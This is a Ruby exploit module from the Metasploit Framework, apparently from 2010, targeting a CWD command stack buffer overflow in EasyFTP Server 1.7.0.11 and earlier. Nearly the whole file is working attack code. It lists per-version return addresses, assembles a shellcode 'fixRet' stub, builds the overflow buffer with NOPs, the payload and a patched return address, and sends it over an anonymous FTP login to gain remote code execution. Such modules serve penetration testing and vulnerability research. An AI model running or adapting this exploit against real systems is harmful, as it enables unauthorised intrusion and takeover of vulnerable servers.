##
# $Id: easyftp_cwd_fixret.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EasyFTP Server <= 1.7.0.11 CWD Command Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11
				and earlier. EasyFTP fails to check input size when parsing 'CWD' commands, which
				leads to a stack based buffer overflow.  EasyFTP allows anonymous access by
				default; valid credentials are typically unnecessary to exploit this vulnerability.

				After version 1.7.0.12, this package was renamed "UplusFtp".

				This exploit utilizes a small piece of code that I\'ve referred to as 'fixRet'.
				This code allows us to inject of payload of ~500 bytes into a 264 byte buffer by
				'fixing' the return address post-exploitation.  See references for more information.
			},
			'Author'         =>
				[
					'Paul Makowski <my.hndl [at] gmail.com>', # original version
					'jduck' # various fixes, remove most hardcoded addresses
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'OSVDB', '62134' ],
					[ 'URL', 'http://paulmakowski.wordpress.com/2010/02/28/increasing-payload-size-w-return-address-overwrite/' ],
					[ 'URL', 'http://paulmakowski.wordpress.com/2010/04/19/metasploit-plugin-for-easyftp-server-exploit' ],
					[ 'URL', 'http://seclists.org/bugtraq/2010/Feb/202' ],
					[ 'URL', 'http://code.google.com/p/easyftpsvr/'],
					[ 'URL', 'https://tegosecurity.com/etc/return_overwrite/RCE_easy_ftp_server_1.7.0.2.zip' ],
					[ 'URL', 'http://www.securityfocus.com/bid/38262/exploit']
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					# Total bytes able to write without crashing program (505) - length of fixRet (25) - slack space (30) = 450
					'Space'    => 505 - 30 - 25,
					'BadChars' => "\x00\x0a\x2f\x5c", # from: http://downloads.securityfocus.com/vulnerabilities/exploits/38262-1.py
					'DisableNops' => true
				},
			'Platform'	 => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal - v1.7.0.2',   { 'Ret' => 0x00404121 } ], # call edi - from ftpbasicsvr.exe
					[ 'Windows Universal - v1.7.0.3',   { 'Ret' => 0x00404121 } ], # call edi - from ftpbasicsvr.exe
					[ 'Windows Universal - v1.7.0.4',   { 'Ret' => 0x00404111 } ], # call edi - from ftpbasicsvr.exe
					[ 'Windows Universal - v1.7.0.5',   { 'Ret' => 0x004040ea } ], # call edi - from ftpbasicsvr.exe
					[ 'Windows Universal - v1.7.0.6',   { 'Ret' => 0x004040ea } ], # call edi - from ftpbasicsvr.exe
					[ 'Windows Universal - v1.7.0.7',   { 'Ret' => 0x004040ea } ], # call edi - from ftpbasicsvr.exe
					[ 'Windows Universal - v1.7.0.8',   { 'Ret' => 0x004043ca } ], # call edi - from ftpbasicsvr.exe
					[ 'Windows Universal - v1.7.0.9',   { 'Ret' => 0x0040438a } ], # call edi - from ftpbasicsvr.exe
					[ 'Windows Universal - v1.7.0.10',  { 'Ret' => 0x0040435a } ], # call edi - from ftpbasicsvr.exe
					[ 'Windows Universal - v1.7.0.11',  { 'Ret' => 0x0040435a } ], # call edi - from ftpbasicsvr.exe
				],
			'DisclosureDate' => 'Feb 16 2010',
			'DefaultTarget' => 0))
	end

	def check
		connect
		disconnect

		if (banner =~ /BigFoolCat/) # EasyFTP Server has undergone several name changes
			return Exploit::CheckCode::Vulnerable
		end
			return Exploit::CheckCode::Safe
	end

	def exploit
		connect_login

		# If the payload's length is larger than 233 bytes then the payload must be bisected with the return address and later patched.
		# Explanation of technique: http://paulmakowski.wordpress.com/2010/02/28/increasing-payload-size-w-return-address-overwrite/

		# NOTE:
		# This exploit jumps to edi, which happens to point at a partial version of
		# the 'buf' string in memory. The fixRet below fixes up the code stored on the
		# stack and then jumps there to execute the payload. The value in esp is used
		# with an offset for the fixup.
		fixRet_asm = %q{
			mov ecx, 0xdeadbeef
			mov edi, esp
			sub edi, 0xfffffe14
			mov [edi], ecx
			add edi, 0xffffff14
			jmp edi
		}
		fixRet = Metasm::Shellcode.assemble(Metasm::Ia32.new, fixRet_asm).encode_string

		buf = ''

		print_status("Prepending fixRet...")
		buf << fixRet
		buf << make_nops(0x20 - buf.length)
		#buf << "C" * (0x20 - buf.length)

		print_status("Adding the payload...")
		buf << payload.encoded

		# Backup the original return address bytes
		buf[1,4] = buf[268,4]

		print_status("Overwriting part of the payload with target address...")
		buf[268,4] = [target.ret].pack('V') # put return address @ 268 bytes

		# NOTE: SEH head at offset 256 also gets smashed. That is, it becomes what is at fs:[0] ..

		print_status("Sending exploit buffer...")
		send_cmd( ['CWD', buf] , false) # this will automatically put a space between 'CWD' and our attack string

		handler
		disconnect
	end

end